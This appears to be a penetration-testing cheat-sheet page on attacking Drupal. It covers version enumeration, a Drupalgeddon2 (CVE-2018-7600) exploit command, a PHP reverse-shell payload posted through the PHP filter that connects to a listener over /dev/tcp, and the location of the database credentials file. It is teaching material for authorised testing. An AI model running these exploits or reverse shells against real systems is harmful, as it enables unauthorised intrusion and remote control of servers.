---
title: Drupal
category: Software
order: 2
---

# Enumeration

We can obtain the server version on the next resource:

```
https://target.com/core/install.php
```

# Drupalgeddon (<7.58, <8.5.1, <8.46, <8.3.9) - CVE-2018-7600

All version of drupal lower than 7.58 are vulnerable to RCE.

```
ruby drupalgeddon2.rb http://<ip>/
```
* [https://github.com/dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

# From Admin to Reverse Shell

Firstly we need to enable `PHP filter` on Modules tab.

![](/hackingnotes/images/durpal_rce_1.png)

And go to Content -> +Add Content -> Article, select **PHP code** as Text Format and finally introduce the reverse shell on the body.

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/4444>&1'"); ?>
```

![](/hackingnotes/images/durpal_rce_2.png)

Finally clicking Preview button a reverse shell is spawned to our listener.

![](/hackingnotes/images/durpal_rce_3.png)

# Config files

## Database Connection

```
$DRUPAL/sites/default/settings.php
```
